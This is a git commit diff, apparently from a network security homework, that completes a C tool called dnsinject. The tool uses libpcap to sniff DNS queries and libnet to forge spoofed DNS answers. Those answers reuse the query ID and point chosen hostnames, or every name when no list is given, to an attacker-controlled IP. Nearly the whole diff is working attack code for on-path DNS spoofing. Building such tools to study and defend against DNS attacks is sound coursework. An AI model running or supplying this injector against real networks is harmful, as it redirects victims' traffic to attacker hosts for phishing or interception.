8585614b7d205fb1340339807d7d48ea8050fb01
Aman Agarwal <agarwal1510@gmail.com>
2017-11-25 14:39:49 -0500

    dnsinject working

--- Makefile
+++ Makefile
@@ -2,7 +2,7 @@ CC=gcc
 CFLAGS=-O3
 
 all:
-	$(CC) $(CFLAGS) -g hw4.c -o dnsinject -lpcap -lresolv
+	$(CC) $(CFLAGS) -g hw4.c -o dnsinject -lpcap -lresolv -lnet
 
 clean:
 	$(RM) dnsinject
--- hw4.c
+++ hw4.c
@@ -4,7 +4,6 @@
 #include<pcap.h>
 #include<netinet/ether.h>
 #include<netinet/if_ether.h>
-#include<netinet/ether.h>
 #include<netinet/in.h>
 #include<netinet/ip.h>
 #include<stdint.h>
@@ -21,22 +20,48 @@
 #define UDP_HEADER_SIZE 8
 #define DNS_HEADER_SIZE 12
 
+
+
+struct dnshdr   {
+	unsigned    id:      16;
+	unsigned    rd:       1;
+	unsigned    tc:       1;
+	unsigned    aa:       1;
+	unsigned    opcode:   4;
+	unsigned    qr:       1;
+	unsigned    rcode:    4;
+	unsigned    cd:       1;
+	unsigned    ad:       1;
+	unsigned    unused:   1;
+	unsigned    ra:       1;
+	unsigned    qdcount: 16;
+	unsigned    ancount: 16;
+	unsigned    nscount: 16;
+	unsigned    arcount: 16;
+};
+
+
 char ip[100][16];
 char hostnames[100][128];
 int hostname_count = 0;
 char *interface = NULL;
+u_int32_t lIP = -1;
+libnet_t *context;
+char errbuf[LIBNET_ERRBUF_SIZE];
 
-char* append_www(char *hostname) {
-	if (strncmp("www.", hostname, 4) == 0) {
-		return hostname;
-	} else {
-		char w[128] = "www.";
-		strcat(w, hostname);
-		hostname = w;
-		fprintf(stderr, "append: %s\n",hostname);
-		return hostname;
-	}
-}
+/*char* append_www(char *hostname) {
+  if (strncmp("www.", hostname, 4) == 0) {
+  hostname[strlen(hostname)-1] = '\0';
+  return hostname;
+  } else {
+  char w[128] = "www.";
+  strcat(w, hostname);
+  hostname = w;
+  hostname[strlen(w)-1] = '\0';
+  fprintf(stderr, "append: %s",hostname);
+  return hostname;
+  }
+  } */
 
 void readHostnameFile(char *filename) {
 	int i = 0;
@@ -44,14 +69,16 @@ void readHostnameFile(char *filename) {
 	char ret[256];
 	FILE *fd = fopen(filename, "r");
 	if (fd == NULL) {
-		fprintf(stderr, "Hostname file cannot be opened");
+		fprintf(stderr, "Hostname file name incorrect");
+		exit(EXIT_FAILURE);
 	} else {
 		while (fgets(line, sizeof(line), fd) != NULL && strlen(line) > 1) {
 			char *token = strtok(line, " ");
 			while (token) {
 				strcpy (ip[i], token);
 				token = strtok(NULL, " ");
-				token = append_www(token);
+				//token = append_www(token);
+				token[strlen(token)-1] = '\0';
 				strcpy(hostnames[i],token);
 				token = strtok(NULL, " ");
 				fprintf(stderr, "%s %s", ip[i], hostnames[i]);
@@ -63,29 +90,43 @@ void readHostnameFile(char *filename) {
 	fclose(fd);
 }
 
-int check_hostnames(char *hostname) {
+in_addr_t check_hostnames(char *hostname) {
 	int i = 0;	
 	if (hostname_count > 0) {
 		for (i = 0; i < hostname_count; i++) {
+			//fprintf(stderr, "Search: %s %s\n", hostnames[i], hostname);
 			if (strcmp(hostnames[i], hostname) == 0) {
-				break;
+				fprintf(stderr, "Found\n");	
+				return inet_addr(ip[i]);
 			}
 		}
+	} else {
+		return -1;
 	}
 	if (i == hostname_count)
 		return -1;
-	else
-		return i;
 }
 
-char *getLocalIP(char *interface) {
-	struct ifreq ifr;
-	int fd = socket(AF_INET, SOCK_DGRAM, 0);
-	ifr.ifr_addr.sa_family = AF_INET;
-	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
-	ioctl(fd, SIOCGIFADDR, &ifr);
-	close(fd);
-	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+void setLocalIP(char *interface) {
+	/*	struct ifreq ifr;
+		int fd = socket(AF_INET, SOCK_DGRAM, 0);
+		ifr.ifr_addr.sa_family = AF_INET;
+		strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
+		ioctl(fd, SIOCGIFADDR, &ifr);
+		close(fd);
+		return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+
+*/	
+	if ((context = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL) {
+		fprintf(stderr, "Libnet init failed");
+		return;
+	}
+	if ((lIP = libnet_get_ipaddr4(context)) == -1) {
+		fprintf(stderr, "Getting local IP error");
+		return;
+	}
+	libnet_destroy(context);	
+
 }
 
 void handler(u_char *usrarg, const struct pcap_pkthdr* pkthdr, const u_char *packet) {
@@ -94,56 +135,97 @@ void handler(u_char *usrarg, const struct pcap_pkthdr* pkthdr, const u_char *pac
 		return;
 	}
 	const struct ip *ip = (struct ip*) (packet + SIZE_ETHERNET);
-	u_int size_ip = (ip->ip_hl)*4;
-        if (size_ip < 20) {
-                return;
+	//u_int size_ip = (ip->ip_hl)*4;
+	if ((ip->ip_hl)*4 < 20) {
+		return;
 	}
 	if (ip->ip_p != IPPROTO_UDP) {
 		return;
 	}
 
 	struct udphdr *udp;
-	udp = (struct udphdr *) (packet + SIZE_ETHERNET + size_ip);
+	udp = (struct udphdr *) (packet + SIZE_ETHERNET + IP_HEADER_SIZE);
 	if (ntohs(udp->dest) != 53) {
 		return;
 	}
 
-	
-	
+
+
 	struct dnshdr *dns;
-	dns = (struct dnshdr *) (packet + SIZE_ETHERNET + size_ip + UDP_HEADER_SIZE);
-	
-//	if (dns->opcode != QUERY) {
-//		return;
-//	}
-	
-	char *dns_payload = (char *) (packet + SIZE_ETHERNET + size_ip + UDP_HEADER_SIZE + DNS_HEADER_SIZE);
-	
-//	fprintf(stderr, "%s\n", dns_payload);
+	dns = (struct dnshdr *) (packet + SIZE_ETHERNET + IP_HEADER_SIZE + UDP_HEADER_SIZE);
+
+	//	if (dns->opcode != QUERY) {
+	//		return;
+	//	}
+
+	char *dns_payload = (char *) (packet + SIZE_ETHERNET + IP_HEADER_SIZE + UDP_HEADER_SIZE + DNS_HEADER_SIZE);
+
+	//	fprintf(stderr, "%s\n", dns_payload);
 	char hostname[128];
 	if (dn_expand((u_char *)dns, (u_char *)(packet + pkthdr->caplen), dns_payload, hostname, sizeof(hostname)) < 0) {
 		return;
 	}
+	hostname[strlen(dns_payload)-1] = '\0';
 	fprintf(stderr, "Hostname: %s\n", hostname);
 	int type = (int)*(dns_payload + strlen(dns_payload) + 2);
-	fprintf(stderr, "Type: %d", (int)*(dns_payload + strlen(dns_payload) + 2));
+	//	fprintf(stderr, "Type: %d", (int)*(dns_payload + strlen(dns_payload) + 2));
 	if (type != T_A) {
 		return;
 	}
-	
-	int i;
-	char *localIP = getLocalIP(interface);
-	fprintf(stderr, "IP: %s", localIP);
 
-	if ((i = check_hostnames(hostname)) == -1) {
-		fprintf(stderr, "No match");
+	int i;
+	//	char *localIP;
+
+	u_int32_t localIP = -1;
+	if (hostname_count == 0 || (localIP = check_hostnames(hostname)) == -1) {
+		//fprintf(stderr, "In");
+		//		localIP = getLocalIP(interface);
+		localIP = lIP;
+
+	}
+//	fprintf(stderr, "IP: %d", localIP);
+
+	//	fprintf (stderr, "%d", libnet_name2addr4(context, localIP, LIBNET_DONT_RESOLVE));
+
+	u_char response[512];
+
+	memcpy(response, dns_payload, strlen(dns_payload) + 5);	
+	memcpy(response + strlen(dns_payload) + 5,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
+	//	*((u_long *)(response + strlen(dns_payload) + 17)) = libnet_name2addr4(context, localIP, LIBNET_DONT_RESOLVE);
+	*((u_long *)(response + strlen(dns_payload) + 17)) = localIP;	
+
+	int response_size = strlen(dns_payload) + 21;
+	int packetSize = LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H + response_size;
+
+
+	if ((context = libnet_init(LIBNET_RAW4, interface, errbuf)) == NULL) {
+		fprintf(stderr, "Libnet init error");
 		return;
 	}
 
 
-	
+	if (libnet_build_dnsv4(LIBNET_DNS_H, ntohs((short)dns->id), 0x8580, 1, 1, 0, 0, response, response_size, context, 0) == -1) {
+		fprintf(stderr, "dns build failed");
+		return;
+	}
+
+	if (libnet_build_udp(ntohs(udp->dest), ntohs(udp->source), packetSize - LIBNET_IPV4_H, 0, NULL, 0, context, 0) == -1) {
+		fprintf(stderr, "udp build failed");
+		return;
+	}
 
 
+	if (libnet_build_ipv4(packetSize, 0, 8964, 0, 64, IPPROTO_UDP, 0, ip->ip_dst.s_addr, ip->ip_src.s_addr, NULL, 0, context, 0) == -1) {
+		fprintf(stderr, "ipv4 build failed");
+		return;
+	}
+
+	if (libnet_write(context) == -1) {
+		fprintf(stderr, "Write failed");
+		return;
+	}
+
+	libnet_destroy(context);
 
 }
 
@@ -180,7 +262,9 @@ int main(int argc, char **argv) {
 			printf("Expression: %s\n",expr);
 		}
 	}
-	readHostnameFile(hostname);
+	if (hostname != NULL) {
+		readHostnameFile(hostname);
+	}
 	dev = pcap_lookupdev(errbuf);
 	if (dev == NULL) {
 		fprintf(stderr, "Couldn't find device: %s\n", errbuf);
@@ -217,6 +301,8 @@ int main(int argc, char **argv) {
 		fprintf(stderr, "Set filter error %s\n", pcap_geterr(handle));
 		return -1;
 	}
+
+	setLocalIP(interface);
 	// pcap_loop(pcap_t*, cnt, handler,u_char *userarg)
 	pcap_loop(handle, -1, handler, hostname);
 	pcap_freecode(&fp);
